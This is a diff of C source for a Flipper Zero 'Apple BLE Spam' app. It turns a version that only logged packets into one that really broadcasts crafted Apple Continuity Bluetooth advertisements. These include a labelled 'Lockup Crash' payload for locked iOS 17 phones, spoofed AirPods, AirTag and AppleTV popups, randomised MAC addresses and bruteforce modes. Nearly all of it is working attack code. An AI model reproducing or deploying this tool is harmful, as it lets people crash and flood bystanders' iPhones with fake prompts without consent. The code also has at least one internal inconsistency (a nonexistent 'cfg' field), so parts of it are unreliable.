@@ -4,285 +4,333 @@
 #include <furi_hal_bt.h>
 #include <stdint.h>
 #include <furi_hal_random.h>
+#include <extra_beacon.h>
 #include "apple_ble_spam_icons.h"
 
 // Continuity protocol definitions (included directly to avoid linking issues)
 typedef enum {
-    ContinuityTypeAirDrop,
-    ContinuityTypeAirplayTarget,
-    ContinuityTypeHandoff,
-    ContinuityTypeTetheringSource,
-    ContinuityTypeNearbyAction,
-    ContinuityTypeNearbyInfo,
-    ContinuityTypeProximityPair,
+    ContinuityTypeAirDrop = 0x05,
+    ContinuityTypeProximityPair = 0x07,
+    ContinuityTypeAirplayTarget = 0x09,
+    ContinuityTypeHandoff = 0x0C,
+    ContinuityTypeTetheringSource = 0x0E,
+    ContinuityTypeNearbyAction = 0x0F,
+    ContinuityTypeNearbyInfo = 0x10,
     ContinuityTypeCustomCrash,
     ContinuityTypeCount,
 } ContinuityType;
 
-typedef struct {
-    uint8_t flags;
-    uint8_t type;
-} NearbyAction;
+typedef enum {
+    PayloadModeRandom,
+    PayloadModeValue,
+    PayloadModeBruteforce,
+} PayloadMode;
 
 typedef struct {
-    uint8_t prefix;
-    uint16_t model;
-} ProximityPair;
-
-typedef struct {
-    // Empty for now, can be extended
-} AirDrop;
-
-typedef struct {
-    // Empty for now, can be extended
-} AirplayTarget;
-
-typedef struct {
-    // Empty for now, can be extended
-} Handoff;
-
-typedef struct {
-    // Empty for now, can be extended
-} TetheringSource;
-
-typedef struct {
-    // Empty for now, can be extended
-} NearbyInfo;
-
-typedef struct {
-    // Empty for now, can be extended
-} CustomCrash;
-
-typedef union {
-    NearbyAction nearby_action;
-    ProximityPair proximity_pair;
-    AirDrop airdrop;
-    AirplayTarget airplay_target;
-    Handoff handoff;
-    TetheringSource tethering_source;
-    NearbyInfo nearby_info;
-    CustomCrash custom_crash;
-} ContinuityData;
+    uint8_t counter;
+    uint32_t value;
+    uint8_t size;
+} Bruteforce;
 
 typedef struct {
     ContinuityType type;
-    ContinuityData data;
-} ContinuityMsg;
+    union {
+        struct {
+            uint16_t model;
+            uint8_t color;
+            uint8_t prefix;
+        } proximity_pair;
+        struct {
+            uint8_t action;
+            uint8_t flags;
+        } nearby_action;
+    } data;
+} ContinuityCfg;
+
+typedef struct {
+    bool random_mac;
+    PayloadMode mode;
+    Bruteforce bruteforce;
+    ContinuityCfg continuity;
+} Payload;
+
+typedef struct {
+    const char* title;
+    const char* text;
+    Payload payload;
+} Attack;
 
 // Continuity functions (included directly)
 const char* continuity_get_type_name(ContinuityType type) {
     switch(type) {
         case ContinuityTypeAirDrop: return "AirDrop";
+        case ContinuityTypeProximityPair: return "ProximityPair";
         case ContinuityTypeAirplayTarget: return "AirplayTarget";
         case ContinuityTypeHandoff: return "Handoff";
         case ContinuityTypeTetheringSource: return "TetheringSource";
         case ContinuityTypeNearbyAction: return "NearbyAction";
         case ContinuityTypeNearbyInfo: return "NearbyInfo";
-        case ContinuityTypeProximityPair: return "ProximityPair";
         case ContinuityTypeCustomCrash: return "CustomCrash";
         default: return "Unknown";
     }
 }
 
-uint8_t continuity_get_packet_size(ContinuityType type) {
+// Working packet generation from the functional version
+static void make_continuity_packet(uint8_t* _size, uint8_t** _packet, Payload* payload) {
+    ContinuityCfg* cfg = payload ? &payload->cfg.continuity : NULL;
+
+    ContinuityType type;
+    if(cfg && cfg->type != 0x00) {
+        type = cfg->type;
+    } else {
+        const ContinuityType types[] = {
+            ContinuityTypeProximityPair,
+            ContinuityTypeNearbyAction,
+            ContinuityTypeCustomCrash,
+        };
+        type = types[rand() % COUNT_OF(types)];
+    }
+
+    uint8_t size = 27; // Standard size for most types
+    uint8_t* packet = malloc(size);
+    uint8_t i = 0;
+
+    packet[i++] = size - 1; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = type; // Continuity Type
+    packet[i] = size - i - 1; // Continuity Size
+    i++;
+
     switch(type) {
-        case ContinuityTypeNearbyAction:
-        case ContinuityTypeProximityPair:
-        case ContinuityTypeCustomCrash:
-            return 27; // Standard size for these types
-        default:
-            return 27; // Default size
+    case ContinuityTypeProximityPair: {
+        uint16_t model;
+        uint8_t color;
+        switch(payload ? payload->mode : PayloadModeRandom) {
+        case PayloadModeRandom:
+        default: {
+            // Random AirPods model
+            const uint16_t models[] = {0x0E20, 0x0220, 0x0055, 0x0A20};
+            model = models[rand() % COUNT_OF(models)];
+            color = 0x00; // White
+            break;
+        }
+        case PayloadModeValue:
+            model = cfg->data.proximity_pair.model;
+            color = cfg->data.proximity_pair.color;
+            break;
+        case PayloadModeBruteforce:
+            model = cfg->data.proximity_pair.model = payload->bruteforce.value;
+            color = cfg->data.proximity_pair.color;
+            break;
+        }
+
+        uint8_t prefix;
+        if(cfg && cfg->data.proximity_pair.prefix != 0x00) {
+            prefix = cfg->data.proximity_pair.prefix;
+        } else {
+            if(model == 0x0055)
+                prefix = 0x05;
+            else
+                prefix = 0x01;
+        }
+
+        packet[i++] = prefix; // Prefix
+        packet[i++] = (model >> 0x08) & 0xFF; // Device Model
+        packet[i++] = (model >> 0x00) & 0xFF; // ...
+        packet[i++] = 0x55; // Status
+        packet[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds Battery Level
+        packet[i++] = ((rand() % 8) << 4) + (rand() % 10); // Charging Status and Battery Case Level
+        packet[i++] = (rand() % 256); // Lid Open Counter
+        packet[i++] = color; // Device Color
+        packet[i++] = 0x00;
+        furi_hal_random_fill_buf(&packet[i], 16); // Encrypted Payload
+        i += 16;
+        break;
     }
-}
 
-void continuity_generate_packet(const ContinuityMsg* msg, uint8_t* packet) {
-    switch(msg->type) {
-        case ContinuityTypeNearbyAction: {
-            // Nearby Action packet structure
-            packet[0] = 0x04; // Length
-            packet[1] = 0x04; // Type (Nearby Action)
-            packet[2] = msg->data.nearby_action.flags;
-            packet[3] = msg->data.nearby_action.type;
-            packet[4] = 0x00; // Padding
-            packet[5] = 0x00;
-            packet[6] = 0x0f;
-            packet[7] = 0x05;
-            packet[8] = 0xc0;
-            packet[9] = 0x02;
-            packet[10] = 0x60;
-            packet[11] = 0x4c; // Apple company ID (little endian)
-            packet[12] = 0x00;
-            // Fill remaining bytes with zeros
-            for(int i = 13; i < 27; i++) {
-                packet[i] = 0x00;
-            }
-            break;
-        }
-        
-        case ContinuityTypeProximityPair: {
-            // Proximity Pair packet structure
-            packet[0] = 0x07; // Length
-            packet[1] = 0x19; // Type (Proximity Pair)
-            packet[2] = 0x05; // Subtype
-            packet[3] = 0x00; // Flags
-            packet[4] = msg->data.proximity_pair.prefix;
-            packet[5] = (msg->data.proximity_pair.model >> 8) & 0xFF; // Model high byte
-            packet[6] = msg->data.proximity_pair.model & 0xFF; // Model low byte
-            packet[7] = 0x00; // Padding
-            packet[8] = 0x00;
-            packet[9] = 0x00;
-            packet[10] = 0x00;
-            packet[11] = 0x00;
-            packet[12] = 0x00;
-            packet[13] = 0x00;
-            packet[14] = 0x00;
-            packet[15] = 0x00;
-            packet[16] = 0x00;
-            packet[17] = 0x00;
-            packet[18] = 0x00;
-            packet[19] = 0x00;
-            packet[20] = 0x00;
-            packet[21] = 0x00;
-            packet[22] = 0x00;
-            packet[23] = 0x00;
-            packet[24] = 0x00;
-            packet[25] = 0x00;
-            packet[26] = 0x00;
-            break;
-        }
-        
-        case ContinuityTypeCustomCrash: {
-            // Custom Crash packet structure (iOS 17 crash)
-            packet[0] = 0x04; // Length
-            packet[1] = 0x04; // Type
-            packet[2] = 0x20; // Flags
-            packet[3] = 0x00; // Subtype
-            packet[4] = 0x00; // Padding
-            packet[5] = 0x00;
-            packet[6] = 0x0f;
-            packet[7] = 0x05;
-            packet[8] = 0xc0;
-            packet[9] = 0x02;
-            packet[10] = 0x60;
-            packet[11] = 0x4c; // Apple company ID
-            packet[12] = 0x00;
-            // Fill remaining bytes with zeros
-            for(int i = 13; i < 27; i++) {
-                packet[i] = 0x00;
-            }
-            break;
-        }
-        
+    case ContinuityTypeNearbyAction: {
+        uint8_t action;
+        switch(payload ? payload->mode : PayloadModeRandom) {
+        case PayloadModeRandom:
         default:
-            // Default packet structure
-            for(int i = 0; i < 27; i++) {
-                packet[i] = 0x00;
-            }
+            // Random nearby actions
+            const uint8_t actions[] = {0x13, 0x27, 0x20, 0x09, 0x02, 0x0B};
+            action = actions[rand() % COUNT_OF(actions)];
             break;
+        case PayloadModeValue:
+            action = cfg->data.nearby_action.action;
+            break;
+        case PayloadModeBruteforce:
+            action = cfg->data.nearby_action.action = payload->bruteforce.value;
+            break;
+        }
+
+        uint8_t flags;
+        if(cfg && cfg->data.nearby_action.flags != 0x00) {
+            flags = cfg->data.nearby_action.flags;
+        } else {
+            flags = 0xC0;
+            if(action == 0x20 && rand() % 2) flags--; // More spam for 'Join This AppleTV?'
+            if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched 'Setup New Device'
+        }
+
+        packet[i++] = flags; // Action Flags
+        packet[i++] = action; // Action Type
+        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
+        i += 3;
+        break;
     }
+
+    case ContinuityTypeCustomCrash: {
+        // iOS 17 Crash payload
+        uint8_t action = 0x20; // Join This AppleTV?
+        uint8_t flags = 0xC0;
+
+        i -= 2; // Override segment header
+        packet[i++] = ContinuityTypeNearbyAction; // Continuity Type
+        packet[i++] = 5; // Continuity Size
+        packet[i++] = flags; // Action Flags
+        packet[i++] = action; // Action Type
+        furi_hal_random_fill_buf(&packet[i], 3); // Authentication Tag
+        i += 3;
+
+        packet[i++] = 0x00; // Additional Action Data Terminator
+        packet[i++] = 0x00; // ...
+
+        packet[i++] = ContinuityTypeNearbyInfo; // Continuity Type
+        furi_hal_random_fill_buf(&packet[i], 3); // Continuity Size + Shenanigans
+        i += 3;
+        break;
+    }
+
+    default:
+        // Fill remaining bytes with zeros
+        for(int j = i; j < size; j++) {
+            packet[j] = 0x00;
+        }
+        break;
+    }
+
+    *_size = size;
+    *_packet = packet;
 }
-
-typedef struct {
-    const char* title;
-    const char* text;
-    bool random;
-    ContinuityMsg msg;
-} Payload;
-
-// Simplified BLE approach - using standard Flipper functions
-#define TAG "AppleBLESpam"
 
 // Payload definitions for different Apple BLE spam types
-static Payload payloads[] = {
+static Attack attacks[] = {
     {.title = "Lockup Crash",
      .text = "iOS 17, locked, long range",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeCustomCrash,
-         .data = {.custom_crash = {}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeCustomCrash,
+         },
      }},
     {.title = "Random Action",
      .text = "Spam shuffle Nearby Actions",
-     .random = true,
-     .msg = {
-         .type = ContinuityTypeNearbyAction,
-         .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
+     .payload = {
+         .random_mac = true,
+         .mode = PayloadModeRandom,
+         .continuity = {
+             .type = ContinuityTypeNearbyAction,
+         },
      }},
     {.title = "Random Pair",
      .text = "Spam shuffle Proximity Pairs",
-     .random = true,
-     .msg = {
-         .type = ContinuityTypeProximityPair,
-         .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
+     .payload = {
+         .random_mac = true,
+         .mode = PayloadModeRandom,
+         .continuity = {
+             .type = ContinuityTypeProximityPair,
+         },
      }},
     {.title = "AppleTV AutoFill",
      .text = "Banner, unlocked, long range",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeNearbyAction,
-         .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action = 0x13}},
+         },
      }},
     {.title = "AppleTV Connecting...",
      .text = "Modal, unlocked, long range",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeNearbyAction,
-         .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action = 0x27}},
+         },
      }},
     {.title = "Join This AppleTV?",
      .text = "Modal, unlocked, spammy",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeNearbyAction,
-         .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action = 0x20}},
+         },
      }},
     {.title = "Transfer Phone Number",
      .text = "Modal, locked",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeNearbyAction,
-         .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action = 0x02}},
+         },
      }},
     {.title = "Setup New iPhone",
      .text = "Modal, locked",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeNearbyAction,
-         .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action = 0x09}},
+         },
      }},
     {.title = "Airtag",
      .text = "Modal, unlocked",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeProximityPair,
-         .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.model = 0x0055, .color = 0x00, .prefix = 0x05}},
+         },
      }},
     {.title = "AirPods Pro",
      .text = "Modal, spammy (auto close)",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeProximityPair,
-         .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.model = 0x0E20, .color = 0x00, .prefix = 0x01}},
+         },
      }},
     {.title = "AirPods",
      .text = "Modal, spammy (auto close)",
-     .random = false,
-     .msg = {
-         .type = ContinuityTypeProximityPair,
-         .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
+     .payload = {
+         .random_mac = false,
+         .mode = PayloadModeValue,
+         .continuity = {
+             .type = ContinuityTypeProximityPair,
+             .data = {.proximity_pair = {.model = 0x0220, .color = 0x00, .prefix = 0x01}},
+         },
      }},
 };
 
-#define PAYLOAD_COUNT ((signed)COUNT_OF(payloads))
+#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
 
-struct {
-    uint8_t count;
-    ContinuityData** datas;
-} randoms[ContinuityTypeCount] = {0};
-
-uint16_t delays[] = {
-    20, 50, 100, 150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 4000, 5000,
-};
+static uint16_t delays[] = {20, 50, 100, 150, 200, 300, 400, 500, 750, 1000, 1500, 2000, 2500, 3000, 4000, 5000};
 
 typedef struct {
     bool resume;
@@ -290,44 +338,51 @@ typedef struct {
     uint8_t delay;
     uint8_t size;
     uint8_t* packet;
-    Payload* payload;
+    Attack* attack;
     FuriTimer* timer;
     uint8_t mac[6];
     int8_t index;
     FuriString* status_text;
+    GapExtraBeaconConfig config;
 } State;
 
-// Simple timer-based approach instead of custom HCI
+// Working BLE implementation using extra_beacon API
+static void start_extra_beacon(State* state) {
+    uint8_t size;
+    uint8_t* packet;
+    uint16_t delay = delays[state->delay];
+    GapExtraBeaconConfig* config = &state->config;
+    Payload* payload = &state->attack->payload;
+
+    config->min_adv_interval_ms = delay;
+    config->max_adv_interval_ms = delay * 1.5;
+    if(payload->random_mac) {
+        furi_hal_random_fill_buf(config->address, sizeof(config->address));
+    }
+    furi_check(furi_hal_bt_extra_beacon_set_config(config));
+
+    make_continuity_packet(&size, &packet, payload);
+    furi_check(furi_hal_bt_extra_beacon_set_data(packet, size));
+    free(packet);
+
+    furi_check(furi_hal_bt_extra_beacon_start());
+}
+
 static void adv_timer_callback(void* ctx) {
     State* state = ctx;
     if(!state->advertising) return;
     
-    // Generate packet
-    ContinuityMsg* msg = &state->payload->msg;
-    ContinuityType type = msg->type;
-    
-    if(state->payload->random) {
-        uint8_t random_i = rand() % randoms[type].count;
-        memcpy(&msg->data, randoms[type].count > 0 ? randoms[type].datas[random_i] : &state->payload->msg.data, sizeof(msg->data));
+    // Stop previous beacon if active
+    if(furi_hal_bt_extra_beacon_is_active()) {
+        furi_check(furi_hal_bt_extra_beacon_stop());
     }
     
-    continuity_generate_packet(msg, state->packet);
-    
-    // Log the packet for debugging
-    FURI_LOG_I(TAG, "Sending packet type: %s, size: %d", 
-               continuity_get_type_name(type), state->size);
-    
-    // For now, just log the packet instead of sending it
-    // This prevents crashes while we debug
-    char hex_str[128] = {0};
-    for(int i = 0; i < state->size && i < 16; i++) {
-        snprintf(hex_str + (i * 3), 4, "%02X ", state->packet[i]);
-    }
-    FURI_LOG_I(TAG, "Packet data: %s", hex_str);
+    // Start new beacon
+    start_extra_beacon(state);
     
     // Update status
     furi_string_printf(state->status_text, "Sent: %s", 
-                      continuity_get_type_name(type));
+                      continuity_get_type_name(state->attack->payload.continuity.type));
     
     // Restart timer
     furi_timer_start(state->timer, delays[state->delay]);
@@ -339,17 +394,17 @@ static void stop_adv(State* state) {
     state->advertising = false;
     furi_timer_stop(state->timer);
     
+    if(furi_hal_bt_extra_beacon_is_active()) {
+        furi_check(furi_hal_bt_extra_beacon_stop());
+    }
+    
     if(state->resume) {
         furi_hal_bt_start_advertising();
     }
     
     furi_string_set(state->status_text, "Stopped");
     
-    if(state->packet) {
-        free(state->packet);
-        state->packet = NULL;
-    }
-    state->payload = NULL;
+    state->attack = NULL;
     state->size = 0;
 }
 
@@ -357,11 +412,11 @@ static void start_adv(State* state) {
     if(state->advertising) return;
     
     state->advertising = true;
-    state->size = continuity_get_packet_size(state->payload->msg.type);
-    state->packet = malloc(state->size);
     
-    // Generate random MAC
-    furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
+    // Initialize extra beacon config
+    state->config.adv_channel_map = GapAdvChannelMapAll;
+    state->config.adv_power_level = GapAdvPowerLevel_6dBm;
+    state->config.address_type = GapAddressTypePublic;
     
     // Remember if BLE was active
     state->resume = furi_hal_bt_is_active();
@@ -373,20 +428,20 @@ static void start_adv(State* state) {
     furi_timer_start(state->timer, delays[state->delay]);
     
     furi_string_printf(state->status_text, "Started: %s", 
-                      state->payload->title);
+                      state->attack->title);
 }
 
-static void toggle_adv(State* state, Payload* payload) {
+static void toggle_adv(State* state, Attack* attack) {
     if(state->advertising) {
         stop_adv(state);
     } else {
-        state->payload = payload;
+        state->attack = attack;
         start_adv(state);
     }
 }
 
 #define PAGE_MIN (-5)
-#define PAGE_MAX PAYLOAD_COUNT
+#define PAGE_MAX ATTACKS_COUNT
 enum {
     PageApps = PAGE_MIN,
     PageDelay,
@@ -394,7 +449,7 @@ enum {
     PageProximityPair,
     PageNearbyAction,
     PageStart = 0,
-    PageEnd = PAYLOAD_COUNT - 1,
+    PageEnd = ATTACKS_COUNT - 1,
     PageAbout = PAGE_MAX,
 };
 
@@ -519,8 +574,8 @@ static void draw_callback(Canvas* canvas, void* ctx) {
             false);
         break;
     default: {
-        if(state->index < 0 || state->index > PAYLOAD_COUNT - 1) break;
-        const Payload* payload = &payloads[state->index];
+        if(state->index < 0 || state->index > ATTACKS_COUNT - 1) break;
+        const Attack* attack = &attacks[state->index];
         char str[32];
 
         canvas_set_font(canvas, FontPrimary);
@@ -535,15 +590,15 @@ static void draw_callback(Canvas* canvas, void* ctx) {
             sizeof(str),
             "%02i/%02i: %s",
             state->index + 1,
-            PAYLOAD_COUNT,
-            continuity_get_type_name(payload->msg.type));
+            ATTACKS_COUNT,
+            continuity_get_type_name(attack->payload.continuity.type));
         canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);
 
         canvas_set_font(canvas, FontPrimary);
-        canvas_draw_str(canvas, 4, 34, payload->title);
+        canvas_draw_str(canvas, 4, 34, attack->title);
 
         canvas_set_font(canvas, FontSecondary);
-        canvas_draw_str(canvas, 4, 46, payload->text);
+        canvas_draw_str(canvas, 4, 46, attack->text);
 
         // Show status
         canvas_set_font(canvas, FontSecondary);
@@ -573,22 +628,15 @@ static void input_callback(InputEvent* input, void* ctx) {
 int32_t apple_ble_spam_app(void* p) {
     UNUSED(p);
     
-    // Initialize random data for random payloads
-    for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
-        if(payloads[payload_i].random) continue;
-        randoms[payloads[payload_i].msg.type].count++;
+    // Save previous BLE state
+    GapExtraBeaconConfig prev_cfg;
+    const GapExtraBeaconConfig* prev_cfg_ptr = furi_hal_bt_extra_beacon_get_config();
+    if(prev_cfg_ptr) {
+        memcpy(&prev_cfg, prev_cfg_ptr, sizeof(prev_cfg));
     }
-    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
-        if(!randoms[type].count) continue;
-        randoms[type].datas = malloc(sizeof(ContinuityData*) * randoms[type].count);
-        uint8_t random_i = 0;
-        for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
-            if(payloads[payload_i].random) continue;
-            if(payloads[payload_i].msg.type == type) {
-                randoms[type].datas[random_i++] = &payloads[payload_i].msg.data;
-            }
-        }
-    }
+    uint8_t prev_data[EXTRA_BEACON_MAX_DATA_SIZE];
+    uint8_t prev_data_len = furi_hal_bt_extra_beacon_get_data(prev_data);
+    bool prev_active = furi_hal_bt_extra_beacon_is_active();
 
     State* state = malloc(sizeof(State));
     memset(state, 0, sizeof(State));
@@ -613,23 +661,23 @@ int32_t apple_ble_spam_app(void* p) {
         InputEvent input;
         furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);
 
-        Payload* payload = (state->index >= 0 && state->index <= PAYLOAD_COUNT - 1) ?
-                               &payloads[state->index] :
+        Attack* attack = (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ?
+                               &attacks[state->index] :
                                NULL;
         bool advertising = state->advertising;
         switch(input.key) {
         case InputKeyOk:
-            if(payload) toggle_adv(state, payload);
+            if(attack) toggle_adv(state, attack);
             break;
         case InputKeyUp:
-            if(payload && state->delay < COUNT_OF(delays) - 1) {
+            if(attack && state->delay < COUNT_OF(delays) - 1) {
                 if(advertising) stop_adv(state);
                 state->delay++;
                 if(advertising) start_adv(state);
             }
             break;
         case InputKeyDown:
-            if(payload && state->delay > 0) {
+            if(attack && state->delay > 0) {
                 if(advertising) stop_adv(state);
                 state->delay--;
                 if(advertising) start_adv(state);
@@ -637,18 +685,18 @@ int32_t apple_ble_spam_app(void* p) {
             break;
         case InputKeyLeft:
             if(state->index > PAGE_MIN) {
-                if(advertising) toggle_adv(state, payload);
+                if(advertising) toggle_adv(state, attack);
                 state->index--;
             }
             break;
         case InputKeyRight:
             if(state->index < PAGE_MAX) {
-                if(advertising) toggle_adv(state, payload);
+                if(advertising) toggle_adv(state, attack);
                 state->index++;
             }
             break;
         case InputKeyBack:
-            if(advertising) toggle_adv(state, payload);
+            if(advertising) toggle_adv(state, attack);
             running = false;
             break;
         default:
@@ -668,10 +716,17 @@ int32_t apple_ble_spam_app(void* p) {
     furi_string_free(state->status_text);
     free(state);
 
-    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
-        if(randoms[type].datas) {
-            free(randoms[type].datas);
-        }
+    // Restore previous BLE state
+    if(furi_hal_bt_extra_beacon_is_active()) {
+        furi_check(furi_hal_bt_extra_beacon_stop());
     }
+    if(prev_cfg_ptr) {
+        furi_check(furi_hal_bt_extra_beacon_set_config(&prev_cfg));
+    }
+    furi_check(furi_hal_bt_extra_beacon_set_data(prev_data, prev_data_len));
+    if(prev_active) {
+        furi_check(furi_hal_bt_extra_beacon_start());
+    }
+
     return 0;
 }
